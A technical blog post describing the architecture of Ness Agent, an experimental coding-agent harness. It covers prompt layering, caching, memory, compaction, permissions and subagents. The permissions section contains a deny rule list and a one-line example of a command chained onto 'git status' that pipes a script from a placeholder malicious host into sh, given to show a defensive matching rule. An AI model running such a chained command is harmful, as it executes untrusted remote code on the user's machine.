---
title: "Inside Ness Agent: Building the Harness Around the Model"
date: "2026-08-09"
description: "Context Engineering, Prompt Caching, Tools, Memory, Compaction, Permissions and the runtime architecture behind Ness Agent."
image: "assets/blog_cover_image.png"
slug: inside-coding-agent-building-the-harness-around-the-model
---
Most discussions about coding agents begin with the model. With every new release, the first thing you see is the **Artificial Analysis Intelligence Index**. What is its intelligence score? What about token efficiency or cost? How long can it sustain an agentic trajectory? Or, increasingly, which company did the latest model supposedly hack?

But the LLM is only one part of the agent. It does not clone a repository, decide what belongs in context, expose tools to itself, preserve state across turns, ask for permission before executing `rm`, or remember what happened forty tool calls ago.

**The harness does.**

Recent evidence suggests that this systems layer matters almost as much as the model itself. [Claw-SWE-Bench](https://arxiv.org/pdf/2606.12344) found that changing the model moved Pass@1 by **29.4 percentage points**, while changing the harness with the model fixed moved it by **27.4 points**. On one GLM 5.1 setup, changing only the adapter moved performance from **19.1% to 73.4%**.

A second study, [*Dive into Claude Code*](https://arxiv.org/pdf/2604.14228v2), makes the same point from an architectural angle: the core agent loop is simple, call the model, execute tools, feed the results back, repeat. Most of the engineering sits around that loop.

Those observations were also the motivation behind **Ness Agent**, an experimental coding-agent harness I have been building in Python. It is my attempt to understand and implement the systems layer around the model: a reusable LangGraph-based SDK plus an opinionated coding CLI with tools, plan/act modes, prompt layering, skills, MCP, permissions, memory, reflection, compaction, subagents, persistence and Git-worktree isolation.

This article is about that implementation, inspired by systems such as Claude Code, OpenCode, Pi, OpenHands and Hermes.

---

### 1. Start With the Stupidest Agent That Works

Strip away the CLI, memory, skills, MCP, permissions, hooks and databases, and the remaining tool-using agent looks quite small.

```python
messages = [user_message]

while True:
    response = model(messages, tools=tools)
    messages.append(response)

    if not response.tool_calls:
        return response

    for call in response.tool_calls:
        result = execute(call)
        messages.append(result)
```

This simple pattern descends from ReAct-style systems. For small tasks, it can work surprisingly well. Give a sufficiently capable model `read`, `edit` and `shell`, ask it to inspect a function, change three lines and run tests, and it may solve the task.

The problems appear when the trajectory gets longer.

The conversation now contains file contents, grep results, test logs, compiler errors and patches. The repository may have changed substantially since the first turn. MCP servers may expose dozens of external tools. The agent may need domain-specific skills. Eventually the context window approaches its limit. And once the model can run shell commands, a model error is no longer just a bad answer.

A naive tool loop has no concept of stable versus volatile context, permission policy, durable versus episodic memory, deferred capabilities, execution interception, compaction, replay, or workspace isolation.

**The hard part is maintaining the environment in which that loop continues to behave usefully.**

That is the problem Ness tries to make explicit.

---

## Part I — From a Loop to a Runtime

### 2. The Architecture of Ness Agent

Ness is split into two major layers.

![Ness CLI, Ness Agent SDK, and Chat Model API stack](assets/flow4.png)

`src/ness_agent/` contains the reusable agent runtime. `src/ness_cli/` contains the coding-specific adapter: project paths, model configuration, worktree bootstrap, pricing and the TUI.

The SDK separates its major components as well. `NessAgent` defines an agent configuration; `Session` owns execution of a thread; `PromptLayers` owns context construction; `PermissionStore`, `HookRunner`, `SkillLoader`, `MCPRuntime`, `ThreadStore` and `MemoryStore` remain independent components.

That gives the harness two broad kinds of policy.

**Agent-runtime policy:**

> How does a tool call become an execution?  
> How is conversation state checkpointed?  
> When does compaction occur?  
> How are permissions evaluated?

**Application policy:**

> Where does project configuration live?  
> Which skill roots do we trust?  
> How are credentials loaded?  
> What constitutes a repository?  
> How should approvals appear in the terminal?

Keeping those separate is what makes the runtime reusable outside the original CLI.

#### A turn through the runtime

At a high level, a Ness turn looks like this:

![A turn through the Ness runtime: user input, context, compaction, model call, and tool loop](assets/flow1.png)

The actual runtime uses LangGraph rather than literally spelling this as a Python `while True`, but conceptually the loop has not changed much.

### 3. Session: The Runtime Boundary of a Conversation

`NessAgent` describes an agent configuration. A `Session` turns that configuration into one live execution thread.

The graph itself should not have to own every concern associated with a long-running interaction. A session needs identity, lifecycle, streaming, cancellation, resumability, mode transitions and observability around the graph.

![Session runtime boundary: NessAgent configuration flows into Session(thread_id) with graph, mode, context, cancellation, usage, events, and resume, then into the agent graph](assets/flow5.png)

Each `Session` is bound to a thread ID and owns the compiled LangGraph application and its checkpointer. It also keeps the interaction-level state that should not live globally on the reusable `NessAgent`: current mode, pending skills, context pressure, compaction requests, turn usage and cancellation state.

Before a turn enters the graph, the session installs a `runtime context` containing the services needed during execution—permissions, persistence, project paths, skills and the agent configuration itself. This gives graph nodes and tools access to session-scoped dependencies without turning them into global process state.

#### The graph produces execution; the session produces an API

The graph emits lower-level execution events. `Session` translates them into an application-facing stream containing things such as assistant output, tool execution, approval requests, usage, compaction, warnings and interruptions.

That boundary means a terminal UI, server or another host application can observe the runtime without depending directly on LangGraph's internal events.

The same execution path powers both batched with `run()` and streaming usage with `stream()`. One interface collects the complete turn into a result, while another exposes events as they happen.

The session also coordinates lifecycle operations such as plan/act transitions, staged skills, explicit compaction, context previews, resume/rollback bootstrapping and session-end reflection.

### Cancellation is a state transition

Interruption is one example of why this boundary matters.

Simply cancelling the Python task can leave an agent conversation structurally invalid. The model may already have emitted tool calls for which no corresponding tool result was ever recorded.

Ness therefore treats cancellation as a runtime state transition. When a turn is interrupted, the session repairs unresolved tool calls with synthetic failed `ToolMessage`s and records an interruption marker when necessary before allowing the next turn to continue.

That means the next request begins from a structurally valid conversation rather than from a half-written model/tool exchange.

---

## Part II — Context Is the Architecture

### 4. Context Window Is Working Memory

It is tempting to think of an agent context as:

```text
system prompt
+
conversation
```

For a coding agent, it is closer to:

```text
identity
+ universal behavior
+ tool descriptions
+ user preferences
+ repository instructions
+ repository structure
+ current git state
+ todos
+ session memory
+ mode instructions
+ loaded skills
+ user conversation
+ tool outputs
```

All of those tokens compete for the same finite attention budget.

Anthropic's [context-engineering](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents) work describes **context rot**: as context grows, models can become worse at retrieving and using the right information.

The engineering problem therefore is:

> What information should be present, when should it appear, and how long should it remain?

Ness organizes that problem into four layers.

![Prompt layers L0–L3: harness, profile, project, conversation trajectory, and working state](assets/flow2.png)

L0 contains harness identity and universal rules. L1 contains profile-level context, the stable tool and skill catalogs, global `USER.md` preferences and project `NESS.md` conventions. L2 contains application-provided repository or domain context. L3 contains ephemeral working state.

The important property is **volatility**.

L0 changes extremely rarely. L1 changes occasionally. L2 usually remains stable throughout a session. L3 may change every turn.

That gives a general rule:

> Put information at the lowest-volatility layer that can correctly own it.

---

### 5. Prompt Caching Dictates the Architecture

Without caching, long-running agents repeatedly process much of the same prefix.

Prompt caching allows providers to reuse previously processed prefixes. [Don't Break the Cache](https://arxiv.org/abs/2601.06007) measured **41–80% API cost reductions** and **13–31% improvements in time to first token** across providers in its experiments.

The constraint is that the prefix has to remain stable.

Anthropic describes Claude Code's prompt layout as static content first and dynamic content later, specifically because prompt caching works through prefix matching.

Consider this representation of a coding agent's current state:

```text
SYSTEM:

You are a coding agent.

Current branch: feature/auth
Git status: 3 modified files
Current mode: PLAN

Todo:
- inspect auth flow
- verify tests
```

Next turn, one todo disappears. Later the branch changes. Switch from plan mode to act mode, and it changes again.

Each early mutation makes everything after it less reusable from the cache.

#### L3: Ephemeral state as an append-only overlay

Ness therefore keeps volatile working state out of the stable system prefix.

That decision is visible directly in the implementation. The cached L0–L2 prefix is keyed by structural inputs such as active tools, project memory, the skill catalog and metadata:

```python
key = (
    tuple(sorted(t.name for t in tools)),
    git_available,
    hash(user_memory),
    hash(project_memory),
    hash(skill_catalog),
    tool_catalog_groups,
    deferred_mcp,
    _hash_metadata(metadata),
)
```

Notice what is missing: **L3**.

Branch state, todos, mode and episodic memory are expected to change frequently, so they do not participate in the stable-prefix cache identity.

L3 is instead rendered inside `<system-reminder>` tags and appended as an internally tagged tail `HumanMessage`. Fresh user turns receive the full current overlay; subsequent tool-loop iterations receive deltas. These messages exist in the checkpointed model context but are excluded from the semantic transcript, reflection input and durable CLI events.

```text
[ L0: stable harness ]

[ L1: stable profile/project instructions ]

[ L2: session project context ]

[ conversation ... ]

<system-reminder>
  mode: PLAN
  branch: feature/auth  
  todos:
    - verify tests

  session-memory:
    ...
</system-reminder>
```

This preserves model visibility without repeatedly rewriting the stable prefix, matching Anthropic's recommendation to represent dynamic state through messages rather than system-prompt mutations.

---

### 6. Why Plan Mode Still Has Write Tools

The intuitive implementation of plan mode is:

```text
ACT MODE tools:
  [All Tools]

PLAN MODE tools:
  read
  search
  web
```

That appears clean: the model cannot even see the write tools while planning.

But changing the bound tool set also changes the provider-facing request and can invalidate the cached prefix.

Ness keeps the full session tool set bound in both modes and enforces plan mode at execution time. If the model requests a state-changing operation while planning, the runtime rejects it and feeds that rejection back into model state.

The mode instruction itself lives in L3.

A planning turn researches with read-only operations, may use a structured `question` tool when clarification materially changes the plan, and ends with one terminal plan. Switching back to act mode stages a one-shot instruction telling the model to turn the plan into todos before execution begins.

Ness also schedules a **pre-execution context-pressure checkpoint when transitioning plan → act**. If planning consumed too much context, the runtime can compact before entering the mutation-heavy phase.

Plan modes are common across coding agents. The interesting part, in my opinion, is where the state is represented and where it is enforced.

---

### 7. Tools: Capability Without Context Explosion

Ness groups its session capabilities into several broad tiers:

```text
Always available
  ├── todo
  ├── question
  └── skill_view

Core coding
  ├── read / write / edit / delete
  ├── grep / glob
  ├── web_search / fetch_url
  └── shell

Discovery
  ├── search_tools
  └── add_tools

Advanced
  └── spawn_subagent

Deferred
  └── mcp__<server>__<tool>
```

MCP introduces a scaling problem.

A single server might expose dozens of functions. Connect several servers and the agent can suddenly have hundreds of schemas. Eagerly sending all of them wastes context before the agent has done any useful work and can make tool selection itself harder.

Ness therefore treats MCP capabilities as deferred. When an MCP server is loaded, the names and short descriptions of its tools are added to the L1 catalog. The model can then use `search_tools` and `add_tools` to discover and bind only the relevant full schemas.

Claude Code has arrived at a similar constraint with deferred tool loading.

There is an important caveat: **adding a tool is itself a context mutation**. Deferred loading saves context, but mid-session additions can still reduce cache continuity. For tasks that depend heavily on a new integration, starting a fresh session with the needed capability available from the beginning is often cleaner.

There is also a more radical answer: **keep the primitive tool surface extremely small.**

**Pi** is a good example. Its default coding agent exposes only four tools: `read`, `write`, `edit` and `bash`. Everything else is treated as an extension rather than part of the core harness surface.

Ness currently takes a richer approach. A future version may move closer to the Pi model, allowing users to install tool packages from the CLI and explicitly bind, unbind or rebind tool groups between sessions.

---

### 8. Skills: Procedural Knowledge With Progressive Disclosure

Unlike tools, skills answer a different question:

> How should the agent perform a class of tasks?

A React repository may have local conventions for state management. A company may have a release procedure. Putting every procedure into the global system prompt would be wasteful.

Ness supports filesystem-backed skills, with each skill represented by a `SKILL.md` containing metadata and instructions.

The SDK is not tied to a single `.ness/skills/` directory. `SkillLoader` can search multiple user-provided roots, and the CLI can opt into well-known project-local and global locations such as: `.agents/skills`, `.claude/skills`, `.cursor/skills`

Custom roots can be supplied as well. This makes it possible to reuse procedural knowledge already stored for other coding agents rather than forcing every project into a Ness-specific directory.

Only lightweight metadata is exposed eagerly. A one-line catalog of discovered skills is placed in L1:

```text
react_component:
Create React components matching project conventions.
path: .ness/skills/react_component/SKILL.md

release:
Prepare and verify a release.
path: .ness/skills/release/SKILL.md
```

The full body remains outside context until the model explicitly requests it through `skill_view`.

I borrowed this tool-based loading pattern from OpenCode's skill mechanism: expose enough metadata for discovery, then load the complete instructions only when the procedure is actually selected.

Ness also supports category nesting under skill roots, so skills do not all have to live one directory below the root. Discovery currently recurses up to three levels and stops descending once it finds a `SKILL.md`.

Successfully viewed skills are represented in L3 as metadata while their full bodies remain in tool history. After compaction, that metadata gives the model enough information to load the skill again if it is still relevant.

The workflow for skills and MCP is similar:

> Expose cheap metadata eagerly; expose expensive context on demand.

```text
MCP tools

name + description in L1
          ↓
       discover tools
          ↓
   selected full schema
          ↓
      activate tool


skills

name + description in L1
          ↓
      skill_view
          ↓
      full SKILL.md
```
---

## Part III — Building Agents That Survive Long Sessions

### 9. Memory Is Not the Conversation

The 2026 survey [Memory for Autonomous LLM Agents](https://arxiv.org/pdf/2603.07670) describes agent memory as a **write → manage → read** loop: what gets written, how it is transformed, and when it returns to context.

Ness takes a deliberately simple approach. Instead of treating memory as one generic store, it separates information by lifetime:

```text
Global USER.md
    │
    └── cross-project preferences
        loaded into L1

Project .ness/NESS.md
    │
    └── durable repository conventions
        loaded into L1

Per-thread episodic memory
    │
    └── reflected observations
        loaded into L3
````

These filesystem paths are configurable, and the SDK exposes a `MemoryBackend` interface so the storage implementation can be replaced entirely if a host application needs something other than Markdown files.

#### Durable project memory

`.ness/NESS.md` is analogous in spirit to `AGENTS.md` or `CLAUDE.md`.

It contains stable project instructions and conventions and can include existing instruction files:

```text
@AGENTS.md
@CLAUDE.md
```

Ness resolves these includes relative to the project root while guarding against path escapes, cycles and uncontrolled growth.

Crucially, reflection does not continuously rewrite `NESS.md`. It remains human-authored unless the user explicitly chooses to modify it. If the agent takes the wrong trajectory, automatically promoting that reflection into durable project memory could reinforce the mistake.

#### Episodic session memory

Ness maintains a per-thread scratchpad under `.ness/runtime/sessions/`.

Reflection runs periodically as a separate model operation and extracts a bounded set of observations from recent execution history. Those observations return on later turns through L3.

Reflection is optional. Extra model calls have a cost, and for coding tasks the current repository state may often be more important than an increasingly elaborate model-generated memory.


---

### 10. Compaction Is Lossy Compression of Execution State

Every sufficiently long-running agent eventually hits the same physical constraint: the context window fills up. If the session is expected to continue, some part of its history eventually has to be dropped, externalized or compressed.

In Ness `v0.1.0`, I took the straightforward route: extract the older transcript and send it through a separate summarization call. I also experimented with selectively removing or compressing individual messages.

The problem was that this created an entirely new request shape, so the expensive conversation prefix could no longer reuse the prompt cache.

Anthropic describes exactly this failure mode in its Claude Code [caching post](https://claude.com/blog/lessons-from-building-claude-code-prompt-caching-is-everything). Its solution is a **cache-safe fork**: reuse the same system prompt, tools, context and conversation prefix as the parent request, then append the summarization instruction as one additional user message.

Ness `v0.2.0` uses the same idea.

When compaction is due, Ness starts from the last successfully completed bound main-model request the same system message, provider session, tool definitions and native model history and appends a human summary instruction. Failed model or schema attempts never replace this known-good parent binding.

![Cache-safe compaction fork: identical prefix plus summary instruction](assets/flow3.png)

A stripped-down version of the implementation:

```python
request = [
    *messages,
    HumanMessage(content=prompt),
]

response = await model.ainvoke(
    request,
    max_tokens=max_output_tokens,
)
```

Here `messages` and `model` are not a new summarization setup. They are the exact parent request and already-bound main model. Compaction therefore forks from the existing request prefix rather than starting a separate conversation.

#### When Ness compacts

The current policy uses pressure bands:

```text
low pressure
    normal operation

elevated pressure
    warning

high pressure
    summary compaction
```

Compaction can happen earlier when necessary to preserve enough room for the compaction instruction and summary output itself.

More importantly, **the active turn is not summarized**.

The latest unanswered user message and its assistant/tool trajectory remain verbatim. Only completed history is compressed. The live trajectory may still contain exact file contents, command output or test failures needed for the next action.

The resulting summary is inserted as internal continuation context followed by the untouched active turn. Old L3 overlays are removed and rebuilt, so stale working state does not survive merely because it appeared in historical context.

> A small but important note: the compaction model keeps the parent's bound tool schema for cache stability, but any attempted tool call during summarization is treated as an error.

Cache-safe compaction solves the **cost and prefix-reuse problem**, not the harder information-loss problem.

[Factory AI's](https://factory.ai/news/evaluating-compression) evaluation of context-compression methods on software-engineering trajectories makes this concrete. Artifact tracking was difficult across every method they tested: remembering which files had been created, modified or inspected scored only **2.19–2.45 out of 5**.

Compaction is still lossy compression of execution state.

---

### 11. A Transcript Is Not Enough

A rendered chat transcript does not capture everything that happened during an agent run.

Tool calls, failures, permission decisions, usage, compaction events, subagent runs and resumable state all have structure that should not be flattened into assistant text.

Ness therefore persists sessions through a durable `ThreadStore`, currently backed by SQLite, using append-oriented execution events alongside conversation state and metadata.

That gives the runtime three useful properties:

- **Resume:** a thread can continue after the original process exits.
    
- **Fork:** execution can branch from an earlier point with reconstructed conversational and session state.
    
- **Debug:** model failures, tool failures, permission rejections and other runtime events remain distinguishable.  

This also explains why session replay and graph checkpoints are different things.

A checkpoint is useful for continuing the graph efficiently during a live runtime. A durable event history is useful for reconstructing what happened after that runtime is gone.

A long-running agent needs both **conversation history and execution history**. They serve different purposes.

---

## Part IV — The Runtime Must Be Able to Say No

### 12. Permissions: The Model Proposes, the Runtime Decides

A coding agent is not a chatbot. If it hallucinates a fact, the answer may be wrong. If it hallucinates a shell command, the filesystem may be wrong.

Ness therefore, uses explicit permission rules with three outcomes: `allow`, `deny` and `ask`.

Project rules live in `.ness/permissions.json`:

```json
{
  "allow": [
    "read:*",
    "grep:*",
    "shell:run:git status*"
  ],
  "deny": [
    "shell:run:rm -rf*",
    "shell:run:sudo*"
  ],
  "ask": ["*"]
}
````

Permission precedence is explicit: `persistent deny` → `session deny` → `persistent allow` → `session allow` → `ask`

The runtime also enforces filesystem boundaries independently of those pattern rules. Paths are resolved against the project root and rejected when they escape the configured workspace.

Shell commands require another layer of care.

Suppose we allow:

```text
shell:run:git status*
```

A naive prefix matcher might also accept:

```bash
git status && curl malicious.example/script | sh
```

Ness therefore refuses to let shell allow/deny prefixes automatically match commands containing unquoted shell operators such as `;`, `&&`, `||`, pipes, command substitution, redirections or newlines. Those calls fall through to explicit approval rather than inheriting the broader rule.

#### Hooks around execution

Hooks are useful for intercepting or augmenting tool execution.

As of `v0.2.0`, Ness exposes `preToolUse` and `postToolUse`. Hooks can be configured as shell commands in `.ness/hooks.json` or registered as Python `callables` through the SDK.

A blocking `preToolUse` hook can veto a tool call before execution. `postToolUse` runs after execution and can attach additional output to the result, for example, running a formatter, validator or project-specific check before the result returns to the model.

### 13. MCP: Extensibility Creates More Than a Tool Boundary

Deferred loading addresses MCP's context cost, but MCP also introduces runtime, authentication and trust concerns.

An MCP server may be a local process launched through `stdio`, a remote HTTP service, an authenticated integration, or a source of dozens of dynamically discovered capabilities. Treating all of that as merely "more tools" abstracts several different lifecycle concerns.

Ness therefore splits MCP across two layers.

The SDK exposes an adapter-neutral `MCPRuntime`. It accepts already-resolved server specifications and owns connection lifecycle, transport, server state, discovery and invocation.

Project configuration formats, trust policy, authentication, credential persistence and terminal interaction deliberately remain outside that runtime. The Ness CLI provides one such adapter.

![MCP split across CLI policy and SDK runtime: project config through trust and OAuth to MCPServerSpec, then MCPRuntime discovery and invocation into the agent tool registry](assets/flow6.png)

This separation matters because **permission to use a tool and permission to start the system that provides that tool are different decisions**.

The CLI fingerprints runnable MCP configurations so a changed configuration crosses the trust boundary again rather than silently inheriting an earlier approval. Headless execution does not implicitly convert an unknown configuration into a trusted one.

Configuration import is separate again. Importing a compatible server definition makes the configuration available; it does not automatically authorize that server for execution.

> Importing configuration ≠ trusting execution ≠ authorizing a tool call.

These are three different lifecycle decisions.

There is considerably more machinery behind this such as authentication, secret handling, error isolation, connection state, timeouts and compatibility imports. But those are MCP-specific concerns rather than the focus of this article.

---

## Part V — Parallelism Solves an Isolation Problem

### 14. Subagents Give You More Context Windows

Subagents are primarily useful for **parallel investigation** and **context isolation**. Some coding agents go further and allow child agents to perform parallel task execution as well.

Each child gets its own context window, while the parent receives only the result rather than the entire intermediate trajectory. In that sense, a subagent is partly a **context-window partition**.

Ness's implementation is deliberately conservative.

Today, each subagent runs as its own child graph with an independent thread ID and a filtered, read-only tool surface. It does not inherit the parent's full conversation. Instead, it receives a scoped assignment plus role-specific instructions and returns only its final aresult to the parent.

The parent can launch several investigations concurrently, but fan-out is bounded both per batch and globally. Each run is tracked with status, duration, thread ID and output, and is registered against the parent thread for relation and persistence.

The reason is that **parallel reasoning and parallel execution are very different problems**.

Once a child can mutate files or invoke external systems, isolation has to extend beyond context into workspace, permissions and state.

So execution-capable subagents would require a different architecture. Rather than treating a child as a investigative run, I would likely make it a more persistent extension of the main agent graph, with its own session identity linked to the parent thread. That would give the child independent state, permissions and workspace boundaries while preserving explicit parent-child relation.

For now, Ness uses subagents as parallel researchers rather than parallel workers.

---

## Part VI — What Ness Does Not Solve

### 15. What I Still Don't Know

It would be easy to present all of these architectural choices as improvements. I cannot make that claim yet.

Ness has tests and architectural rationale, but it has not been benchmarked rigorously enough to say that L3 overlays improve task success by X, reflection helps by Y, or this compaction strategy is better than another by Z. Those are empirical questions.

Most of the current design came from reading recent agent research, studying production systems such as Claude Code, and combining those ideas with my own choices around extensibility and runtime structure. Some of those choices will almost certainly matter more than others.

There are also obvious weaknesses:

- **Compaction is still lossy.** Cache-safe summarization preserves cache efficiency, not necessarily execution state.
    
- **Reflection is heuristic.** The write policy for memory is hand-designed rather than learned or benchmarked.
    
- **Deferred tools depend on good metadata.** A capability that cannot be discovered is effectively unavailable.
    
- **Cache-aware design inherits provider assumptions.** Different APIs may reward different prompt layouts.
    
- **Permissions become much harder in remote execution**, where filesystems, credentials, networks and long-running approvals become part of the authorization problem.

So for now, I think of Ness less as a proven optimal harness and more as an experimental architecture built from a set of informed bets. The open question is which of those bets actually matter.

### 16. If I Were to Evaluate the Harness

If I do evaluate Ness more rigorously, I would want to measure both **task quality** and **systems behavior**.

At minimum:

- task success / test pass rate
- model turns and tool calls
- repeated file reads
- context growth and compaction frequency
- cached vs uncached tokens
- total cost and latency
- whether important state survives compaction

One idea I am exploring is a separate **Ops/evaluation package** for tuning the harness itself.

Instead of treating prompts, tool descriptions, overlay contents and memory policies as fixed configuration, the package could evaluate variants against benchmark datasets or a user's own representative workloads and use an LLM judge alongside systems metrics to score resulting trajectories.

![Harness tuning loop: tasks and workloads through harness variants to agent trajectories, scored by LLM judge and systems metrics into candidate configuration](assets/flow7.png)

That would be closer to **tuning the harness around a user's workload** than benchmarking one static agent.

A stronger external benchmark, such as **Terminal-Bench**, could then be used as a separate sanity check rather than as the optimization target itself.

> **Some of these experiments can become expensive quickly. If I push this direction further, collaboration with research labs or model/infrastructure providers may make more sense than trying to evaluate every harness dimension independently.**

---

## Conclusion

Building Ness made one thing increasingly obvious to me: the model is only one part of the coding agent.

Context layout affects cache behavior. Tool design affects capability and token usage. Memory and compaction determine whether long sessions remain coherent. Permissions, subagents and worktrees determine how that reasoning can safely interact with real state.

None of these mechanisms are unique to Ness, and I do not yet have the benchmark evidence to say which of my implementation choices are better than the alternatives. In many cases, I borrowed ideas from recent research and production agents and adapted them around a more extensible SDK and CLI architecture.

The interesting engineering problem is therefore no longer just building a model/tool loop. It is designing the runtime around that loop: what context enters it, which capabilities are exposed, what state survives, what gets compressed, and what the model is actually allowed to do.

Ness is my current attempt to explore that design space.

---

### References

#### Ness Agent

- Ness Agent repository and README — project overview, SDK/CLI split and current capabilities.
- Ness Agent architecture — SDK boundary, context layers, agent modes, memory and compaction.
- Ness CLI documentation — permissions, skills, MCP, subagents, worktrees and persistence.
- Ness Agent SDK guide — public runtime abstractions and embedding model.

#### Agent harnesses and architecture

- Zheng et al., _Claw-SWE-Bench: A Benchmark for Evaluating OpenClaw-style Agent Harnesses on Coding Tasks_, 2026.
- Liu et al., _Dive into Claude Code: The Design Space of Today's and Future AI Agent Systems_, 2026.
- OpenHands, _The OpenHands Software Agent SDK_, 2025/2026.

#### Context and caching

- Anthropic, _Lessons from building Claude Code: Prompt caching is everything_, 2026.
- Anthropic, _Effective context engineering for AI agents_, 2025.
- Lumer et al., _Don't Break the Cache: An Evaluation of Prompt Caching for Long-Horizon Agentic Tasks_, 2026.

#### Skills, memory and compression

- Anthropic, _Equipping agents for the real world with Agent Skills_, 2025.
- _Memory for Autonomous LLM Agents: Mechanisms, Evaluation, and Emerging Frontiers_, 2026.
- Factory, _Evaluating Context Compression for AI Agents_.
- Kang et al., _ACON: Optimizing Context Compression for Long-horizon LLM Agents_, ICML 2026.
